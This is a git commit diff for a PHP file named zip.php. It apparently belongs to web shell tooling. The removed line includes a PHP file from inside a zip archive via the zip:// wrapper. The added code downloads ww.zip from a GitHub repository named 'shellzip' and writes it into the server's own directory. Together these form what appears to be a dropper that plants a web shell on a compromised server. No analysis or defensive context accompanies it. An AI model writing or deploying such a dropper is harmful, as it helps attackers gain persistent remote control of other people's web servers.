7bb6206bd04b29e447f4cbcc9506670015e15238
ZeddGans <115491780+Zeddgansz@users.noreply.github.com>
2024-10-07 18:18:40 -0500

    Update zip.php

--- zip.php
+++ zip.php
@@ -1,2 +1,15 @@
 <?php
-require_once  "zip://ww.zip#404.php";
+$file_url = 'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/ww.zip';
+
+$save_to = __DIR__ . '/ww.zip'; // 
+
+
+$file_content = file_get_contents($file_url);
+
+if ($file_content !== false) {
+    file_put_contents($save_to, $file_content);
+    echo "File has been downloaded and saved as $save_to";
+} else {
+    echo "Failed to download file.";
+}
+?>
